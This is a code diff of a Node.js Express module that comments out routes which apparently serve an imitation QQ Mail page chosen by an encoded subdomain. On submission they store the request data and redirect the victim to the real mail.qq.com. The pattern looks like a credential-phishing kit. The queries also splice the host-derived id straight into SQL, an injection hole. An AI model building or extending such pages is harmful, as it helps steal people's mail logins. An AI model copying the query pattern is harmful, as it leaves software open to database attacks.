@@ -31,50 +31,46 @@ module.exports = function (app) {
 
     };
 
-    app.get('/m', function (req, res) {
-        var uidStr = req.headers.host;
-        var uid = uidStr.substr(0, uidStr.indexOf('.'));
-        uid = code.decode(uid);
-        res.statusCode = 404;
-        try {
-            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
-                var mid = rows[0].tempId;
-                var bgUrl = rows[0].bgUrl;
-                var url = rows[0].url;
-                // if (req.device.type === 'phone') {
-                //     return res.render('pages/wap_mail.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
-                // }
-                res.render('pages/wap_mail.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl });
-            });
-        } catch (e) {
-            res.sendFile(path.join(cwd, '/404.html'));
-        }
+    // app.get('/m', function (req, res) {
+    //     var uidStr = req.headers.host;
+    //     var uid = uidStr.substr(0, uidStr.indexOf('.'));
+    //     uid = code.decode(uid);
+    //     res.statusCode = 404;
+    //     try {
+    //         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
+    //             var mid = rows[0].tempId;
+    //             var bgUrl = rows[0].bgUrl;
+    //             var url = rows[0].url;
+    //             res.render('pages/wap_mail.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl });
+    //         });
+    //     } catch (e) {
+    //         res.sendFile(path.join(cwd, '/404.html'));
+    //     }
+    // });
 
-    });
+    // app.post('/k/m', function (req, res) {
+    //     var tz = req.body.tz;
+    //     var uidStr = req.headers.host;
+    //     var uid = uidStr.substr(0, uidStr.indexOf('.'));
+    //     uid = code.decode(uid);
+    //     try {
+    //         insertData(req, function () {
+    //             sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
+    //                 var mid = rows[0].tempId;
+    //                 var bgUrl = rows[0].bgUrl;
+    //                 var url = rows[0].url;
+    //                 if (tz.toString() === '1') {
+    //                     return res.send('<script>window.parent.location.href="http://mail.qq.com";</script>');
+    //                 }
+    //                 // if (req.device.type === 'phone') {
+    //                 //     return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
+    //                 // }
+    //                 res.render('pages/wap_mail.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl });
+    //             });
+    //         });
+    //     } catch (e) {
+    //         res.sendFile(path.join(cwd, '/404.html'));
+    //     }
 
-    app.post('/m', function (req, res) {
-        var tz = req.body.tz;
-        var uidStr = req.headers.host;
-        var uid = uidStr.substr(0, uidStr.indexOf('.'));
-        uid = code.decode(uid);
-        try {
-            insertData(req, function () {
-                sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
-                    var mid = rows[0].tempId;
-                    var bgUrl = rows[0].bgUrl;
-                    var url = rows[0].url;
-                    if (tz.toString() === '1') {
-                        return res.send('<script>window.parent.location.href="http://mail.qq.com";</script>');
-                    }
-                    // if (req.device.type === 'phone') {
-                    //     return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
-                    // }
-                    res.render('pages/wap_mail.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl });
-                });
-            });
-        } catch (e) {
-            res.sendFile(path.join(cwd, '/404.html'));
-        }
-
-    });
+    // });
 }
